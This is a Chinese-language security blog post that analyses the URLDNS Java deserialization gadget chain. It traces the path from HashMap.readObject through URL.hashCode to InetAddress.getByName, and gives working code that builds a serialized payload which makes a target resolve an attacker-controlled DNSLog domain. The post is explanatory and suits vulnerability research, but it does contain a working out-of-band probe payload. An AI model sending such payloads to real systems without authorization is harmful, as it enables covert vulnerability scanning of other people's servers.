# 漏洞篇 - URLDNS 利用链分析
> 2024-05-10
> 来源：https://changeyourway.github.io/2024/05/10/Java%20%E5%AE%89%E5%85%A8/%E6%BC%8F%E6%B4%9E%E7%AF%87-URLDNS%E5%88%A9%E7%94%A8%E9%93%BE%E5%88%86%E6%9E%90/

本文详尽地讲述了 URLDNS 反序列化利用链的原理

## URLDNS 利用链分析

推荐博客：[JAVA反序列化-ysoserial-URLDNS原理分析](https://xz.aliyun.com/t/9116?time__1311=n4+xuDgD9DyDnDfhx0xxBqDwp0Ytunew+4GQ734D&alichlgref=https://www.google.com/)

URLDNS 反序列化利用链的结果就是发起一次 URL 请求，在 DNS 服务器上留下一条解析记录，常常作为验证漏洞是否存在的手段。

### 原理分析

**具体的利用点在 URL 类的 hashcode 函数中**

在 Java 中，hashCode() 是 Object 类中的一个方法，用于返回一个对象的哈希码（hash code），该哈希码是一个 int 类型的数值，代表了该对象的特定标识符。 哈希码的主要作用是在集合中进行元素的快速查找，比如在 HashMap 和 HashSet 中。

先来看一个简单的示例：

首先在 Yakit 上生成一个可用域名：ihqkfolumv.dgrh3.cn

![](/images/image-20240502110230821.png)

写好如下 Java 程序：

```
import java.net.MalformedURLException;
import java.net.URL;

public class Main {
    public static void main(String[] args) throws MalformedURLException {
        // 调用URL类的hashCode方法发起DNS请求
        URL url = new URL("http://ihqkfolumv.dgrh3.cn");
        url.hashCode();
    }
}
```

其中，ihqkfolumv.dgrh3.cn 是我们自己生成的域名，用于被 Java 程序访问，这样在 DNS 服务器上就会留下一条访问记录。

运行后在 Yakit 这里会留下一条解析记录：

![](/images/image-20240502110456487.png)

**下面来查看源代码了解原理**

Ctrl + 鼠标左键点击进入 URL 类的 hashcode 方法：

```
public synchronized int hashCode() {
    if (hashCode != -1)
        return hashCode;

    hashCode = handler.hashCode(this);
    return hashCode;
}
```

可以看到，这里先做了一个判断，然后调用了 handler 的 hashCode 方法。而 handler 是 URL 类中定义的一个属性：

```
transient URLStreamHandler handler;
```

接着 Ctrl + 鼠标左键点击进入 handler 对象（也即 URLStreamHandler 类）的 hashcode 方法：

```
protected int hashCode(URL u) {
    int h = 0;

    // Generate the protocol part.
    String protocol = u.getProtocol();
    if (protocol != null)
        h += protocol.hashCode();

    // Generate the host part.
    InetAddress addr = getHostAddress(u);
    if (addr != null) {
        h += addr.hashCode();
    } else {
        String host = u.getHost();
        if (host != null)
            h += host.toLowerCase().hashCode();
    }

    // Generate the file part.
    String file = u.getFile();
    if (file != null)
        h += file.hashCode();

    // Generate the port part.
    if (u.getPort() == -1)
        h += getDefaultPort();
    else
        h += u.getPort();

    // Generate the ref part.
    String ref = u.getRef();
    if (ref != null)
        h += ref.hashCode();

    return h;
}
```

这个方法传入一个 URL 类作为参数，依次通过调用 getProtocol ，getHostAddress，getFile，getPort，getRef 等方法获取到传入的 URL 链接的 Protocol（协议），HostAddress（主机地址），File（文件路径），Port（端口），Ref（锚点，即 # 后面的部分），获取完之后，对每部分调用它们的 hashCode 方法，将结果加到 h 上，最后将 h 返回。

不过，我们需要重点关注的是 getHostAddress 方法，该方法会返回一个 IP 地址，如果遇到的是域名，那么就需要发起 DNS 请求来将其解析成 IP 地址。

Ctrl + 鼠标左键点击进入 getHostAddress 方法：

```
protected synchronized InetAddress getHostAddress(URL u) {
    if (u.hostAddress != null)
        return u.hostAddress;

    String host = u.getHost();
    if (host == null || host.equals("")) {
        return null;
    } else {
        try {
            u.hostAddress = InetAddress.getByName(host);
        } catch (UnknownHostException ex) {
            return null;
        } catch (SecurityException se) {
            return null;
        }
    }
    return u.hostAddress;
}
```

如果 u.hostAddress 为空，那么调用 URL 类的 getHost 方法获取主机地址（可以是 IP 也可以是域名），如果获取到的主机地址不为空，那么会调用 InetAddress 类的静态方法 getByName 并将主机名作为参数传入。

重点来了：InetAddress.getByName 是一个强大而实用的方法，它**允许我们根据主机名获取对应的 IP 地址，并在各种网络应用场景中发挥巨大的作用**。

在这里就涉及到了 DNS 解析，那么这条利用链的功能也就是归于此处。再往下的源码就不看了，有兴趣可以自己看看。

### 反序列化利用

#### 入口类 HashMap

选择该类作为入口类的原因很简单：

-   实现了 Serializable 接口，可以被反序列化

```
public class HashMap<K,V> extends AbstractMap<K,V> implements Map<K,V>, Cloneable, Serializable
```

-   重写了 readObject 方法
    
-   参数类型宽泛，只要是 Object 都可以
    
-   JDK 自带
    

……

#### 构造 payload

先看结果，后面再讲原理

**序列化类 serialization**

```
public class serialization {
    public static void main(String[] args) throws Exception {
        HashMap hashMap = new HashMap();
        URL url = new URL("http://jhdmbaithu.dgrh3.cn");

        Class clazz = Class.forName("java.net.URL");
        Field f = clazz.getDeclaredField("hashCode");
        f.setAccessible(true);

        hashMap.put(url,"test");
        f.set(url,-1);
        ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream("out.bin"));
        oos.writeObject(hashMap);
    }
}
```

这个类将 URL 类的对象作为参数传入 hashMap 中，并在 hashMap 用 put 方法将数据存储后利用反射修改了 url 的 hashCode 属性为 -1 。运行后，会将序列化数据输出到 out.bin 文件中，且也会进行一次 DNS 解析。

**由于进行了 DNS 解析，本地存在了解析记录，那么第二次解析就不会去请求 DNS 服务器，所以要刷新一下本地的 DNS 缓存，防止之后执行反序列化看不到解析记录**

Windows cmd 窗口输入以下命令刷新 DNS 解析缓存：

```
ipconfig/flushdns
```

![](/images/image-20240502132852109.png)

**反序列化类 unserialization**

```
public class unserialization {
    public static void main(String[] args) throws Exception {
        ObjectInputStream ois = new ObjectInputStream(new FileInputStream("out.bin"));
        HashMap hashMap = (HashMap) ois.readObject();
    }
}
```

执行反序列化后会多出一条解析记录。

**执行完序列化和反序列化之后，查看 Yakit ，会出现两次解析记录：**

![](/images/image-20240502133353810.png)

#### 序列化时进行 DNS 解析的原理

来看序列化类：

```
public class serialization {
    public static void main(String[] args) throws Exception {
        HashMap hashMap = new HashMap();
        URL url = new URL("http://jhdmbaithu.dgrh3.cn");

        Class clazz = Class.forName("java.net.URL");
        Field f = clazz.getDeclaredField("hashCode");
        f.setAccessible(true);

        hashMap.put(url,"test");
        f.set(url,-1);
        ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream("out.bin"));
        oos.writeObject(hashMap);
    }
}
```

**序列化时调用了 HashMap 的 put 方法，查看 put 方法：**

```
public V put(K key, V value) {
    return putVal(hash(key), key, value, false, true);
}
```

**put 方法中又调用了 HashMap 的 hash 方法，查看 hash 方法：**

```
static final int hash(Object key) {
    int h;
    return (key == null) ? 0 : (h = key.hashCode()) ^ (h >>> 16);
}
```

可以看到，hash 方法中调用了 key 的 hashCode 方法，而 key 就是我们传入的 URL 对象，也即调用了 URL 对象的 hashCode 方法，因此进行了 DNS 解析。

**为什么要用反射修改 url 的 hashCode 属性值**

调用了 url 的 hashCode 方法之后，url 的 hashCode 属性便不再是 -1（初始值为 -1 ，调用 hashCode 方法之后会生成新的值），结合 URL 类的 hashCode 方法来看：

```
public synchronized int hashCode() {
    if (hashCode != -1)
        return hashCode;

    hashCode = handler.hashCode(this);
    return hashCode;
}
```

下一次调用 url 的 hashCode 方法就不会再调用 handler.hashCode 方法，也就不会进行 DNS 解析了。为了之后的反序列化能够顺利进行 DNS 解析，这里用反射来修改 url 的 hashCode 属性值重新为 -1 。

#### 反序列化时进行 DNS 解析的原理

来看反序列化类：

```
public class unserialization {
    public static void main(String[] args) throws Exception {
        ObjectInputStream ois = new ObjectInputStream(new FileInputStream("out.bin"));
        HashMap hashMap = (HashMap) ois.readObject();
    }
}
```

由于 HashMap 重写了 readObject 方法，因此在调用时不会调用 ObjectInputStream 默认的 readObject 方法，而是会调用 HashMap 重写的 readObject 方法。

**查看 HashMap 的 readObject 方法：**

```
private void readObject(java.io.ObjectInputStream s)
    throws IOException, ClassNotFoundException {
    // Read in the threshold (ignored), loadfactor, and any hidden stuff
    s.defaultReadObject();
    reinitialize();
    if (loadFactor <= 0 || Float.isNaN(loadFactor))
        throw new InvalidObjectException("Illegal load factor: " +
                                         loadFactor);
    s.readInt();                // Read and ignore number of buckets
    int mappings = s.readInt(); // Read number of mappings (size)
    if (mappings < 0)
        throw new InvalidObjectException("Illegal mappings count: " +
                                         mappings);
    else if (mappings > 0) { // (if zero, use defaults)
        // Size the table using given load factor only if within
        // range of 0.25...4.0
        float lf = Math.min(Math.max(0.25f, loadFactor), 4.0f);
        float fc = (float)mappings / lf + 1.0f;
        int cap = ((fc < DEFAULT_INITIAL_CAPACITY) ?
                   DEFAULT_INITIAL_CAPACITY :
                   (fc >= MAXIMUM_CAPACITY) ?
                   MAXIMUM_CAPACITY :
                   tableSizeFor((int)fc));
        float ft = (float)cap * lf;
        threshold = ((cap < MAXIMUM_CAPACITY && ft < MAXIMUM_CAPACITY) ?
                     (int)ft : Integer.MAX_VALUE);
        @SuppressWarnings({"rawtypes","unchecked"})
            Node<K,V>[] tab = (Node<K,V>[])new Node[cap];
        table = tab;

        // Read the keys and values, and put the mappings in the HashMap
        for (int i = 0; i < mappings; i++) {
            @SuppressWarnings("unchecked")
                K key = (K) s.readObject();
            @SuppressWarnings("unchecked")
                V value = (V) s.readObject();
            putVal(hash(key), key, value, false, false);
        }
    }
}
```

很多很杂，但其实前面的都不重要，直接看末尾的 for 循环中的最后一条语句：

```
putVal(hash(key), key, value, false, false);
```

见过吧，其实跟序列化时的 put 方法中的内容是一样的，一样的调用了 hash 方法：

```
static final int hash(Object key) {
    int h;
    return (key == null) ? 0 : (h = key.hashCode()) ^ (h >>> 16);
}
```

一样的调用了 key 的 hashCode 方法，也即 URL 对象的 hashCode 方法，进行了 DNS 解析。所以如果前面不把 hashCode 改回 -1 的话，反序列化是不会进行 DNS 解析的哦~

### 调用链总结

```
HashMap#readObject(java.io.ObjectInputStream)
HashMap#hash(Object)
URL#hashCode()
URLStreamHandler#hashCode(URL)
URLStreamHandler#getHostAddress(URL)
InetAddress#getByName(String) # DNS 解析
```
